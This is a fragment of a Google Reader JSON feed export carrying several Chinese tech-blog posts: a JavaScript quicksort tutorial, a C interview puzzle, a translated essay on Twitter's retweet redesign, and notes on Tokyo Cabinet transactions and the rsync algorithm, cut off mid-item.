style=\"color:#7a0874;font-weight:bold\">(</span><span style=\"color:#000000;font-weight:bold\">`</span><span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#800000\">${NOA[*]}</span><span style=\"color:#000000;font-weight:bold\">`</span> <span style=\"color:#007800\">$1</span><span style=\"color:#7a0874;font-weight:bold\">)</span>\n        <span style=\"color:#7a0874;font-weight:bold\">shift</span>\n    <span style=\"color:#000000;font-weight:bold\">else</span>\n        <span style=\"color:#7a0874;font-weight:bold\">break</span>; <span style=\"color:#666666;font-style:italic\"># getopts doesn't find any non-option argument</span>\n    <span style=\"color:#000000;font-weight:bold\">fi</span>\n<span style=\"color:#000000;font-weight:bold\">done</span>\n \n<span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#800000\">${NOA[*]}</span></pre></div></div>\n\n<hr>\n<p><small>© yegle for <a href=\"http://yegle.net\">一阁Blog</a>, 2011. |\n本文短链：<a href=\"http://ye.gl/e/7M\">http://ye.gl/e/7M</a> |\n<a href=\"http://ye.gl/e/7M#comments\">无评论</a> |\nPost tags: <br>\n</small></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.yegle.net/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1302919546180",
    "timestampUsec" : "1302919546180611",
    "id" : "tag:google.com,2005:reader/item/08b7f8c6109432c6",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/like", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "快速排序（Quicksort）的Javascript实现",
    "published" : 1301924170,
    "updated" : 1301924170,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/04/quicksort_in_javascript.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>日本程序员norahiko，写了一个排序算法的<a href=\"http://jsdo.it/norahiko/oxIy/fullscreen\">动画演示</a>，非常有趣。</p><p>这个周末，我就用它当做教材，好好学习了一下各种排序算法。</p>\n\n<p><a href=\"http://jsdo.it/norahiko/oxIy/fullscreen\"><img src=\"http://image.beekka.com/blog/201104/bg2011040401_0.png\"></a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Sorting_algorithm\">排序算法</a>（Sorting algorithm）是计算机科学最古老、最基本的课题之一。要想成为合格的程序员，就必须理解和掌握各种排序算法。</p>\n\n<p>目前，最常见的排序算法大概有七八种，其中<a href=\"http://en.wikipedia.org/wiki/Quicksort\">\"快速排序\"</a>（Quicksort）使用得最广泛，速度也较快。它是图灵奖得主C. A. R. Hoare（1934--）于1960时提出来的。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040402.jpg\"></p>\n\n<p>\"快速排序\"的思想很简单，整个排序过程只需要三步：</p>\n\n<blockquote>\n\n<p>　　（1）在数据集之中，选择一个元素作为\"基准\"（pivot）。</p>\n\n<p>　　（2）所有小于\"基准\"的元素，都移到\"基准\"的左边；所有大于\"基准\"的元素，都移到\"基准\"的右边。</p>\n\n<p>　　（3）对\"基准\"左边和右边的两个子集，不断重复第一步和第二步，直到所有子集只剩下一个元素为止。</p>\n\n</blockquote>\n\n<p>举例来说，现在有一个数据集{85, 24, 63, 45, 17, 31, 96, 50}，怎么对其排序呢？</p>\n\n<p>第一步，选择中间的元素45作为\"基准\"。（基准值可以任意选择，但是选择中间的值比较容易理解。）</p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040403.png\"></p>\n\n<p>第二步，按照顺序，将每个元素与\"基准\"进行比较，形成两个子集，一个\"小于45\"，另一个\"大于等于45\"。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040404.png\"></p>\n\n<p>第三步，对两个子集不断重复第一步和第二步，直到所有子集只剩下一个元素为止。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040405.png\"></p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040406.png\"></p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040407.png\"></p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040408.png\"></p>\n\n<p>下面参照网上的资料（<a href=\"http://acatalept.com/blog/2008/10/28/stable-quicksort-in-javascript/\">这里</a>和<a href=\"http://www.stoimen.com/blog/2010/06/11/friday-algorithms-quicksort-difference-between-php-and-javascript/\">这里</a>），用Javascript语言实现上面的算法。</p>\n\n<p>首先，定义一个quickSort函数，它的参数是一个数组。</p>\n\n<blockquote>\n\n<p>var quickSort = function(arr) {</p>\n\n<p>};</p>\n\n</blockquote>\n\n<p>然后，检查数组的元素个数，如果小于等于1，就返回。</p>\n\n<blockquote>\n\n<p>var quickSort = function(arr) {</p>\n\n<p>　　<strong>if (arr.length &lt;= 1) { return arr; }</strong></p>\n\n<p>};</p>\n\n</blockquote>\n\n<p>接着，选择\"基准\"（pivot），并将其与原数组分离，再定义两个空数组，用来存放一左一右的两个子集。</p>\n\n<blockquote>\n\n<p>var quickSort = function(arr) {</p>\n\n<p>　　if (arr.length &lt;= 1) { return arr; }</p>\n\n<p>　　<strong>var pivotIndex = Math.floor(arr.length / 2) ;</strong></p>\n\n<p>　　<strong>var pivot = arr.splice(pivotIndex, 1)[0];</strong></p>\n\n<p>　　<strong>var left = [];</strong></p>\n\n<p>　　<strong>var right = [];</strong></p>\n\n<p>};</p>\n\n</blockquote>\n\n<p>然后，开始遍历数组，小于\"基准\"的元素放入左边的子集，大于基准的元素放入右边的子集。</p>\n\n<blockquote>\n\n<p>var quickSort = function(arr) {</p>\n\n<p>　　if (arr.length &lt;= 1) { return arr; }</p>\n\n<p>　　var pivotIndex = Math.floor(arr.length / 2) ;</p>\n\n<p>　　var pivot = arr.splice(pivotIndex, 1)[0];</p>\n\n<p>　　var left = [];</p>\n\n<p>　　var right = [];</p>\n\n<p>　　<strong>for (var i = 0; i &lt; arr.length; i++){</strong></p>\n\n<p>　　　　<strong>if (arr[i] &lt; pivot)  {</strong></p>\n\n<p>　　　　　　<strong>left.push(arr[i]);</strong></p>\n\n<p>　　　　<strong>} else {</strong></p>\n\n<p>　　　　　　<strong>right.push(arr[i]);</strong></p>\n\n<p>　　　　<strong>}</strong></p>\n\n<p>　　<strong>}</strong></p>\n\n<p>};</p>\n\n</blockquote>\n\n<p>最后，使用递归不断重复这个过程，就可以得到排序后的数组。</p>\n\n<blockquote>\n\n<p>var quickSort = function(arr) {</p>\n\n<p>　　if (arr.length &lt;= 1) { return arr; }</p>\n\n<p>　　var pivotIndex = Math.floor(arr.length / 2);</p>\n\n<p>　　var pivot = arr.splice(pivotIndex, 1)[0];</p>\n\n<p>　　var left = [];</p>\n\n<p>　　var right = [];</p>\n\n<p>　　for (var i = 0; i &lt; arr.length; i++){</p>\n\n<p>　　　　if (arr[i] &lt; pivot)  {</p>\n\n<p>　　　　　　left.push(arr[i]);</p>\n\n<p>　　　　} else {</p>\n\n<p>　　　　　　right.push(arr[i]);</p>\n\n<p>　　　　}</p>\n\n<p>　　}</p>\n\n<p>　　<strong>return quickSort(left).concat([pivot], quickSort(right));</strong></p>\n\n<p>};</p>\n\n</blockquote>\n\n<p>使用的时候，直接调用quickSort()就行了。 </p>\n\n<p><img src=\"http://image.beekka.com/blog/201104/bg2011040409.png\"></p>\n\n<p>（完）<br>\n</p><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/ejnc7ur4lnr9i3473l340ugd1o/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2011%2F04%2Fquicksort_in_javascript.html\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1302881662673",
    "timestampUsec" : "1302881662673807",
    "id" : "tag:google.com,2005:reader/item/a3cfd915deb6c8e1",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/tracking-kept-unread", "C/C++语言", "趣味问题", "C++", "Puzzle", "面试" ],
    "title" : "“火柴棍式”程序员面试题",
    "published" : 1300667311,
    "updated" : 1300667311,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/3961.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>有时候，有些面试题是很是无厘头，这不，又有一个，还记得小时候玩的的“火柴棍游戏”吗，就是移动一根火柴棍改变一个图或字的游戏。程序面试居然也可以这么玩，看看下面这个火柴棍式的程序面试题吧。</p>\n<p>下面是一个C程序，其想要输出20个减号，不过，粗心的程序员把代码写错了，你需要把下面的代码修改正确，不过，<strong>你只能增加或是修改其中的一个字符</strong>，请你给出三种答案。</p>\n<pre>int n = 20;\n\nfor(int i = 0; i &lt; n; i--){\n    printf(&quot;-&quot;);\n}</pre>\n<p>不要以为这题不是很难，我相信你并不那么容易能找到3种方法。我觉得，如果你能在10分钟内找出这三种方法，说明你真的很聪明，而且反应很快。当然，15分钟内也不赖。不过，你要是30分钟内找不到三种方法，当然，不说明你笨了，最多就是你的反应还不够快。嘿嘿。就当是玩玩吧。</p>\n<p>下面是我的答案：</p>\n<pre>\n//第一种解法：在for循环中给n加一个负号\nfor(int i = 0; i &lt; -n; i--)\n\n//第二种解法：把 n 初始化成 -20\nint n = -20;\n\n//第三种解法：把for循环中的 i 初始化成40\nfor(int i = 40; i &lt; n; i--)\n</pre>\n<p>不过，我要告诉你，<span style=\"color:#cc0000\">以上这些答案都不对（我就知道你会偷看答案的）</span>，不过，顺着这些思路走很接近了。呵呵。</p>\n<p>下面是正确答案——</p>\n<p><span></span></p>\n<p><span><font color=\"#cc0000\">------<b>对不起，你需要回复才能查看内容</b>------</font></span></p>\n<p>其它相关的变种题如下：</p>\n<ul>\n<li>通过修改、增加一个字符，让其输出21个减号</li>\n<li>通过修改、增加一个字符，让其只输出1个减号</li>\n<li>通过修改、增加一个字符，让其不输出减号</li>\n</ul>\n<p>（全文完）</p>\n<h3>相关文章</h3><ul><li>2011年04月02日 -- <a href=\"http://coolshell.cn/articles/4162.html\" title=\"又一个有趣的面试题\">又一个有趣的面试题</a></li><li>2011年02月28日 -- <a href=\"http://coolshell.cn/articles/3738.html\" title=\"打印质数的各种算法\">打印质数的各种算法</a></li><li>2011年01月07日 -- <a href=\"http://coolshell.cn/articles/3445.html\" title=\"输出从1到1000的数\">输出从1到1000的数</a></li><li>2010年12月02日 -- <a href=\"http://coolshell.cn/articles/3345.html\" title=\"140个Google的面试题\">140个Google的面试题</a></li><li>2010年06月23日 -- <a href=\"http://coolshell.cn/articles/2514.html\" title=\"面试题：布尔变量\">面试题：布尔变量</a></li><li>2009年07月30日 -- <a href=\"http://coolshell.cn/articles/1202.html\" title=\"面试题：赛马问题\">面试题：赛马问题</a></li><li>2011年04月06日 -- <a href=\"http://coolshell.cn/articles/4220.html\" title=\"一些有意思的文章和资源\">一些有意思的文章和资源</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1302316312291",
    "timestampUsec" : "1302316312291466",
    "id" : "tag:google.com,2005:reader/item/2395bd442d4a69c6",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read" ],
    "title" : "Twitter CEO：我们为什么要改造「转推」（转载）",
    "published" : 1258442869,
    "updated" : 1317097341,
    "alternate" : [ {
      "href" : "http://wangyuanzju.blog.163.com/blog/static/130292009101732749865",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div><b>我用<a href=\"http://reader.youdao.com/?keyfrom=blog\">有道阅读</a>看到这篇好文，希望和大家分享。我的看法是：</b><br>我对文章中的观点是否合理没有感觉，但感觉到，就这么简单的一个转推功能，也有很多值得雕琢的地方。<br><br>以下<a rel=\"nofollow\" href=\"http://apple4.us/2009/11/evan-williams-on-why-twitter-reforms-retweeting.html\">原文</a>转载自<a rel=\"nofollow\" href=\"http://apple4.us/\">apple4us</a><br><hr><p>作者：Evan Williams；<a rel=\"nofollow\" href=\"http://evhead.com/2009/11/why-retweet-works-way-it-does.html\">原文链接</a></p> <p><u>编者按：如果说 Twitter 是继谷歌之后本世纪最大的互联网现象，这话可能会有人不同意。但不可否认的是，Twitter 昭示了一个「实时互联网」的雏形，而我相信这是互联网的下一个范式变革之地，尤其考虑到 iPhone 对其带来的助推作用。<br> Twitter 的快速流行，本已是一个值得反复探讨的有趣话题，而在它之上的一个用户自发创造的功能——「转推」（Retweet）——的爆炸性传播则是一个缩影。但更为有趣的是，Twitter 官方网站上似乎迟迟不对此巨大的用户需求做出反应，直到最近，他们才试运行了一个令很多用户不快的原生（native）转推功能。Twitter 的 CEO 伊凡·威廉姆斯上周在自己的个人博客上发了一篇长文，陈述了他对于「转推」功能的设计思路。</u></p> <p>这周在 Twitter 上，我们推出了一个新功能，这个功能我们已经开发了相当一段时间并且已让很多用户试用过。（如果你还没有，稍安勿躁。）这个功能就是我们的原生版「转推」，几个月前比兹已经在 Twitter 官方博客上发帖提及【比兹·斯通，Biz Stone，Twitter 的创意总监，公司二号人物——译者注】。</p> <p> 我现在写这篇帖子，是因为我知道这个功能的设计会多少有些争议。人们对「转推」功能应如何实现有很多预想，这很容易理解。我想说一说我们在如何设计这个功能时的一些思路。在 Twitter 内部，我是这个思路的一大支持者，因为——尽管它不会满足所有形式的需求——我认为它提供了一些更新、更强大的东西。</p> <p><big><strong>背景</strong></big></p> <p>正如你们所知，「转推」是件很酷的事情，它诞生于 Twitter 用户之手，表达他们对有趣信息的热情。Twitter 客户端软件的第三方开发者也做出了积极应对，在他们的软件中加入了「转推」功能，尽管我们 Twitter 的人还没有任何行动。这并非首例，这种新型用户行为正是我们的用户和开发者所组成的生态系统最美妙之处。</p> <p>人们很早就开始问我们打算什么时候把 RT 按钮加入 twitter.com。添加「转推」功能会带来很多琐碎的工作，从一些客户端软件之上可见端倪，但这事花了我们很长时间是因为我们想要让它变成一个更基础的功能，我们期望能给它赋予更多价值。</p> <p>尽管「转推」今天已经得到了极大使用，但「转推」本身仍然存在一些问题。其中比较显著的有——</p> <p> <strong>来源不清</strong>。在一条普通的推（tweet）里，包含了用户头像、用户名、以及推文内容。这三者之间有着特别的联系，我们称之为「推文构造」（anatomy of a tweet）。</p> <p>而在我所称的「自发性转推」（organic RTs）中，尽管这几个要素没有变化，但彼此之间的关系却改变了。最显著的是，「转推」的文本不是这个你能看到头像的用户所撰写的，也不是推文中排在第一个的用户名——除非转推人做了注解，因此他们只是推文的部分贡献者。（有时候这些转推人的用户名在推文开头，有些时候是在末尾。）即使你已经习惯了常用的标注方法（其实不止一种），将推文和真正的作者而非头像所有者联系起来，仍然需要你进行额外的头脑运算。</p> <p>我认为这对推文的可读性带来了潜在的巨大问题。我也常常收到别人对我的 @ 回复，以为我就是我转推的内容的原作者。</p> <p><strong>信息破碎且杂乱</strong>。来源不清还算是最好的情况了。更糟糕的是，因为不同客户端软件处理 RT 的方式不同，如果某人转推了一条转推，就会很快变成一锅浆糊。由于自发性转推的推文是可以编辑的，即使原作者的原意不会被转推人扭曲，但原话可能就发生改变了。来源不准确，在任何媒介形态中都可能出现。但在 Twitter 上，由于字数限制，这种情况便成为必然。人们会缩短或者编辑转推的文字，以使其符合规定长度。即使是出于合理的原因，这也会产生误导，以及对原作者的不公。更坏的是，转推是可以造假的，这已经成为了「垃圾推」（spam）的一种形式，假冒公众人物之名推销一些他们本人从来没说过的东西。</p> <p><strong>冗余信息</strong>。如果你关注的 5 个人都转推了同样的内容，你就看到了 5 条重复的推，这或许有用，但带来的噪音（noise）太多了。在搜索时，这种情况更为严重。比较受欢迎的用户被转推的内容足以淹没掉有效的搜索结果。正巧，写到这里时，有人对我发了一条──</p> <span style=\"display:inline\"><img title=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" alt=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" src=\"http://apple4.us/2009/11/16/twitter-reforms-retweeting-1.png\" width=\"500\"></span> <div><br> <p> <strong>噪音（Noisiness）</strong>。我们必须承认，有些人过于热爱转推了。你或许感兴趣他们本人说的话，但你实在无需探知他们兴奋地扣下转推的扳机，打出的每一条链接。今天你惟一的选择，只能是判断他们偶尔说出的珠玑之言是否值得你忍受他们的转推腹泻症【retweetarrhea，作者自造的一个词，即「转推」和「腹泻］的组合──译者注】。</p> <p> <strong>无法追踪（Untrackable）</strong>。转推都可能潜藏着非常有趣的数据。毕竟，如果某事值得你向所有关注者重复说一遍，意味着它比其他信息有更多价值（转推迷除外）。如果某事被一堆人转推──数量多少视原作者有多少关注者而定──这是个有价值的信息，也许有助于人们更快发现有趣的新闻。第三方开发者已经注意到了这一现象，并建立了一些网站来跟踪这些信息（比如<a rel=\"nofollow\" href=\"http://www.retweetrank.com/\"> RetweetRank</a>）。但从根本上来说，这很难做到，因为这些数据是没有结构化的。</p> <p>最后这一点不那么显而易见，但对于 Twitter 实现其目标──帮助人们尽快发现对自己有价值的信息──而言则尤其重要。Twitter 之美，其中一点就在于你能关注朋友、机构、公众人物、或者你觉得有趣的陌生人。但无论你如何细心打理你的关注对象名单，在每日产生数百万条推的今天，你能见到与你最相关的信息吗？或者，你看到了一些好东西，也得到了一些你并不关心的东西，同时错失了大量你并不知道的杀手级推？</p> <p>我会认为，情况是后一种。一个完美的 Twitter 应该只展示你关心的东西──与你相关的、此时此地的、好玩的、任何你会感兴趣的东西──即使它们出自你没有关注的人。当然，它也应该给你最强大、最细致的控制权。我们想要有更多的方式让好东西自动浮现在你眼前。</p> <p><big><strong>前景</strong></big></p> <p>为了达到这个目标，我们试图通过「转推」功能的设计，既能帮助人们发现好东西，又要解决上面提到的这些问题。</p> <p>在几周之前的<a rel=\"nofollow\" href=\"http://groups.google.com/group/twitter-api-announce/browse_thread/thread/1e07e332ec3d449d?pli=1\"><strong>一份声明</strong></a>中（即 Twitter 提供给开发者的官方转推 API），我们让开发者可以将新的转推功能加入他们的客户端软件，我们发布了一些<a rel=\"nofollow\" href=\"http://apple4.us/assets_c/2009/11/retweet-dev-mocks-7-aug-09-758.html\"><strong>简单的示意图</strong></a>，展示了新的转推功能在 twitter.com 上的应用效果。（今天我几次看到有人说我们只在 twitter.com 上提供这个功能，这个说法不对，现在大多数客户端软件都在进行添加这个功能的工作。）</p> <p> 其思路很简单：每条推的下面都有一个转推链接，你只需两次点击，就可以将此推发送给你的关注者。这解决了「<strong>信息破碎且杂乱</strong>」的问题，因为谁都不能对转推进行编辑了（下文会详细说明）。元数据（meta data，如原作者和转推者）不会显示在转推的文字里面，这样也就无需对其进行编辑以缩短长度。由于这个原生功能建入了整个系统，因此这些转推是<strong> 可追踪的</strong>。并且，因为可追踪，我们就能解决<strong>冗余信息</strong>的问题：你的关注对象中有多人转推了同一信息，你也只会看到一条。</p> <p> 转推会更加快捷容易，你再也不用去编辑转推的文字，这样你也不用担心你的关注者是否已经看过了这条推，这会鼓励人们更多进行转推，更多有用的信息也会传播更广。</p> <p> <strong>噪音</strong>问题的处理方式，是新增了一个系统设置，让你可以针对每个关注对象单独开启和关闭他们的转推。也就是说，如果你只想看某人自己写的推，你就可以不用删除他而又免受他的转推之扰。</p> <p> <strong>来源</strong>的问题：为了免除来源不清的麻烦，在你的时间线中，我们会显示出被转推的内容的原作者的用户名和头像──同时在元数据中显示谁转推了此条（当然只显示你加了关注的人）。我们的决定是，这个样子──</p> <span style=\"display:inline\"><img title=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" alt=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" src=\"http://apple4.us/2009/11/16/twitter-reforms-retweeting-2.png\" width=\"500\"></span></div> <div><br> <p>要比这个样子的呈现更好──</p> <span style=\"display:inline\"><img title=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" alt=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" src=\"http://apple4.us/2009/11/16/twitter-reforms-retweeting-3.png\" width=\"500\"></span></div> <div><br> <p>@AleciaHuck 的转推并无过错，只是第一种呈现方式更简洁易读，并且也合理地表明了原作者是 @badbanana。即使你认识 @AleciaHuck，也没有必要将她的头像显露在这里。</p> <p> ［新转推机制］不好的地方是，在自己的时间线中看到非关注对象的头像，这会有点让人吓一跳（甚至会令部分人不快）。我希望这些人能明白：你已经通过自发性转推看到过同样内容了。这只是给了你更多的上下文。我的体验是，你会很快适应，而且这种机制更便于理解事情。如果你觉得某人不断把你不喜欢的人塞进你的时间线，正如之前所言，你只想看人们自己原创的推，你可以（挨个）关闭所有关注对象的转推。自发性转推可没有这样的灵活性。</p> <p> ［新机制］另外一个会让部分人不喜欢的地方是，与自发性转推不同，新机制中你无法对转推添加注释，或者在转推时顺便发表你自己的评论。有些人会在每条转推上加上注释，有些人则从来不加。但在很多情况下，新机制是绝对很有用的。出于简洁的考虑，我们在第一版中去掉了这个功能。不过我们对此还是有一些想法，可能我们将来会加入这个功能。（这一点万万不要忽略。）</p> <p> 那当你特别想在转推中加评论的时候怎么办呢？别忘了，没有人拦着你发推的时候引用别人的推。还有，旧式转推并没有禁止。在这一版本中，我们不得不决定哪些需求是要优先考虑的。但就像 Twitter 之前完全没有转推功能的时候，人们还是有自己的办法。我们这只是多提供了一个选项。</p> <p>不过，最重要的一点是，这个功能应该让 Twitter 更有力地帮助人们找到他们关心的东西。</p> <p>大家要想更明白我们希望达到的效果，就去看 TechCrunch 今年 5 月份一篇帖子《<a rel=\"nofollow\" href=\"http://www.techcrunch.com/2009/05/26/the-awesome-potential-of-retweet/\">转推的惊人潜能</a>》后面的留言吧，帖子的作者大卫·萨克斯（David Sacks）是 PayPal 的前任 COO，现在 Geni 和 Yammer 的 CEO。他在文章中阐明了我上面讲的东西──他描述了现在的转推方式的缺点，并且对于原生转推功能提出了建议，与我们所做的事情完全一致。（信不信由你，在他说之前我们就已经有这个设计思路了──并非我们为了避开盗用他创意的嫌疑。）</p> <p>看到我们的用户和开发者的创造，以及教会了我们转推，我为此激动不已，我们因此才能给它带来更多改进。</p> </div> <a rel=\"nofollow\" href=\"http://apple4.us/feed-redirect.php\"><img title=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" alt=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" src=\"http://apple4.us/images/template/rss/banner-for-feed.png\" border=\"0\"></a><img title=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" alt=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" src=\"http://apple4.us/2009/11/evan-williams-on-why-twitter-reforms-retweeting.html\" border=\"0\" width=\"0\" height=\"0\"> <p><a rel=\"nofollow\" href=\"http://www1.feedsky.com/r/l/feedsky/apple4us/297164278/art01.html\"><img title=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" alt=\"Twitter CEO：我们为什么要改造「转推」（转载） - 风轻扬 - 风轻扬\" ismap src=\"http://www1.feedsky.com/r/i/feedsky/apple4us/297164278/art01.gif\" border=\"0\"></a></p><br><div style=\"padding:5px\"><li>用有道阅读<a href=\"http://reader.youdao.com/b.do?keyfrom=blog&amp;url=http%3A%2F%2Ffeed.feedsky.com%2Fapple4us\">订阅apple4us</a></li><li>到<a href=\"http://reader.youdao.com/?keyfrom=blog\">有道阅读</a>开启快捷的资讯阅读之道</li></div></div>"
    },
    "author" : "风轻扬",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://wangyuanzju.blog.163.com/rss/",
      "title" : "风轻扬",
      "htmlUrl" : "http://wangyuanzju.blog.163.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1302316295648",
    "timestampUsec" : "1302316295648707",
    "id" : "tag:google.com,2005:reader/item/3e2b86f3a5f3c69a",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read" ],
    "title" : "Tokyo Cabinet事务机制初探",
    "published" : 1262250044,
    "updated" : 1262250044,
    "alternate" : [ {
      "href" : "http://wangyuanzju.blog.163.com/blog/static/13029200911315044490",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>名为初探，其实只是乱猜猜而已。之所以又去看下Tokyo Cabinet是因为发现BeansDB也是基于Tokyo Cabinet的，似乎Tokyo Cabinet相当之流行。<br><br>Tokyo Cabinet很好理解，持久化的key-value，还支持遍历，表格与索引。唯一比较费解的是它的事务支持是怎么样的。某个官方文档中说Tokyo Cabinet是基于\"write ahead logging and shadow paging\"来实现事务，事务支持ACID。嗯，这给不了多少信息，除了shadow paging比较奇怪，因为这个技术在支持高并发的数据库中不太用。<br><br>然后看到这个：<br>The database is locked by the thread while the transaction so that only one transaction can be activated with a database object at the same time。<br>和这个：<br>Tokyo Cabinet provides two modes to connect to a database: \"reader\" and\n\"writer\". A reader can perform retrieving but neither storing nor\ndeleting. A writer can perform all access methods. Exclusion control\nbetween processes is performed when connecting to a database by file\nlocking. While a writer is connected to a database, neither readers nor\nwriters can be connected. While a reader is connected to a database,\nother readers can be connect, but writers can not. According to this\nmechanism, data consistency is guaranteed with simultaneous connections\nin multitasking environment.<br><br>嗯，原来事务并发控制是通过一把巨锁来实现的，事务时整个数据库被用写锁锁定，别人不能读也不能写。这样ACID中I的问题解决了。<br><br>剩下A和D，D好搞，有WAL就好做。A是怎么做的呢，嗯，看到这句话就明白了：<br>Because all pages are cached on memory while the transaction, the amount of referred records is limited by the memory capacity.<br><br>原来是，事务修改过的未提交页面必须在内存中不能写出去，这样事务回滚时，只要把内存中的页面扔了就行了，原来是这么个shadow paging法。<br><br>这样，A、I、D都解决了，C嘛，本来就是用来凑数的。这么实现可真是初级简单，但并发度应该不太靠谱吧。<br></div>"
    },
    "author" : "风轻扬",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://wangyuanzju.blog.163.com/rss/",
      "title" : "风轻扬",
      "htmlUrl" : "http://wangyuanzju.blog.163.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1302316281782",
    "timestampUsec" : "1302316281782183",
    "id" : "tag:google.com,2005:reader/item/3cf065c3467326ea",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read" ],
    "title" : "Dropbox差异同步算法rsync及其改进算法原理",
    "published" : 1289553992,
    "updated" : 1316783986,
    "alternate" : [ {
      "href" : "http://wangyuanzju.blog.163.com/blog/static/130292010101252632998",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>之前用过rsync很多次，只知道可以做差异同步也没研究过原理。所谓差异同步是指只通过传输两文件的差异部分将两文件同步到一致，自己取的称谓，不知道学术术语是什么。差异同步算法中最有名的就是rsync系列了。<br><br>近来研究Dropbox，想看看它的同步怎么做的，没找到官方资料，不过据推测应该用的就是<a rel=\"nofollow\" href=\"http://blog.hacker.dk/2008/10/dropbox-is-not-open-source/?reffed=1\">rsync</a>，于是，看看鼎鼎大名的rsync是怎么实现的吧。<br><br>rsync算法要解决的问题很简单：A和B两个文件在两台服务器中，要将A同步到与B一致，要求尽量减少同步带来的网络传输开销。<br><br><b><font size=\"3\">rsync基本算法</font></b><br>先说基本的rsync算法，并不复杂，简单的说是三步：<br>1、按固定大小将A分为多块，每块都计算出一个32位的滚动哈希值和一个128位的MD4（有些也用MD5），发给B一端。<br>2、B一端从位置0开始按的同样块大小的滚动哈希值，查找看是否命中A给的某个滚动哈希值，若匹配，则表明B文件中的这块内容与对应的A中的那块内容很可能是一致的，但由于32位的哈希值强度不够，因此再计算MD4，若还是匹配，则确认是一致内容，这时B发给A端匹配的段号。对于那些不能匹配的内容，则发给A端原始内容。<br>3、A端得到B端给的匹配信息，构造一个与B一致的复本，若是匹配的块，则拷贝原A文件中对应的块，若是不匹配内容则追加之。<br><br>滚动哈希值的设计基于Adler32算法，使得2~K+1字节的哈希可以根据1~K字节哈希和1、K+1字节的内容快速计算得到，这可以提高从位置0开始依次计算滚动哈希值的效率。<br><br>据试验一般来说块大小取500~1000字节效果比较好。<br><br><b><font size=\"3\">rsync初级优化</font></b><br>在上述基本算法之上可以进行一些初级的优化，比如：<br>1、传输数据再做压缩<br>2、先用更短小的哈希值作同步，然后比较同步后二者MD5，如果不一样，再换用更长的哈希值，如此在大多数情况下可以减小哈希值的传输开销。因为如果用500字节的块大小的话，一个32位的滚动哈希值和一个128位的MD4会占用原始数据1/25的开销，并不太小<br><br><b><font size=\"3\">基于rsync的改进算法</font></b><br>基于rsync的改进算法主要有<a rel=\"nofollow\" href=\"http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.21.9683\">多轮rsync</a>和<a rel=\"nofollow\" 